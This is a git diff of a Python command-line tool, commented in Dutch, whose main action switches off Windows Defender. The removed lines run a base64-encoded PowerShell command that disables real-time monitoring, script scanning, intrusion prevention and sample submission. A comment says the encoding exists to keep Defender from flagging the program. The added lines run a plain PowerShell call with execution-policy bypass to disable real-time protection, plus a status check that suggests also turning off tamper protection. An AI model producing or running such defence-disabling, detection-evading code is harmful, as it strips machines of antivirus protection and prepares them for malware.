@@ -1,13 +1,15 @@
 import sys
 import subprocess
-import base64
 import click
 import pyfiglet
 import random
 from banners import banner_list
+import ctypes
 
 
 # Toon de prachtige banner
+
+
 def show_banner():
     selected_banner_ascii = random.choice(banner_list)
     version = 1.0
@@ -25,17 +27,50 @@ def check_os():
         return False
 
 
-# Functie voor het uitzetten van Windows Defender
-def disable_win_defender():
-    # base64 encoding van het commando omdat Windows Defender het programma anders als een virus flagt
-    disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gJHRydWUgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAgJHRydWUgLURpc2FibGVTY3JpcHRTY2FubmluZyAgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZA=="
-    # We mogen het niet in een variabel opslaan, vind Windows defender niet leuk. Vandaar deze prachtige code. (strip voor de newline char, decode om het bytes object naar string te veranderen, f voor fstring.)
+def is_admin():
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        return True
+    else:
+        return False
+
+
+def disable_defender_test():
+    # poweshell CMDlets voor het uitschakelen van Windows Defender
+    disable_defender_cmd = [
+        "powershell",
+        "-ExecutionPolicy", "Bypass",
+        "-NoProfile",
+        "-Command",
+        "Set-MpPreference -DisableRealtimeMonitoring $true"
+    ]
+
     try:
-        subprocess.call(f"runonce.exe \'powershell.exe -Command {base64.b64decode(
-            disable_cmd_b64).strip().decode()}\'", shell=True)
-        return "Defender is uitgeschakeld."
-    except Exception as e:
-        return f"Er ging iets mis: {e}"
+        subprocess.run(disable_defender_cmd, shell=True, check=True,
+                       capture_output=True, text=True)
+        print("real-time bescherming is uitgeschakeld")
+    except subprocess.CalledProcessError as e:
+        print(f"Fout bij het uitschakelen van Defender: {e.stderr}")
+
+
+def check_defender_status():
+    check_defender_status_cmd = [
+        "powershell",
+        "-ExecutionPolicy", "Bypass",
+        "-NoProfile",
+        "-Command",
+        "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"
+    ]
+    try:
+        result = subprocess.run(check_defender_status_cmd,
+                                shell=True, capture_output=True, text=True)
+        status = result.stdout.strip()
+        if status == "True":
+            return "Defender real-time protection is UITGESCHAKELD"
+        else:
+
+            return "Defender real-time protection is  nog INGESCHAKELD, probeer tamper protection uit te zetten."
+    except subprocess.CalledProcessError as error:
+        print(f"fout bij het uitschakelen van defender: {error}")
 
 
 def show_running_processes():
@@ -60,7 +95,7 @@ def main(action):
         case "disable_defender":
             # Is dit een windows omgeving?
             if check_os():
-                click.echo(disable_win_defender())
+                click.echo(disable_defender_test())
             else:
                 click.echo(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {
                            sys.platform}")
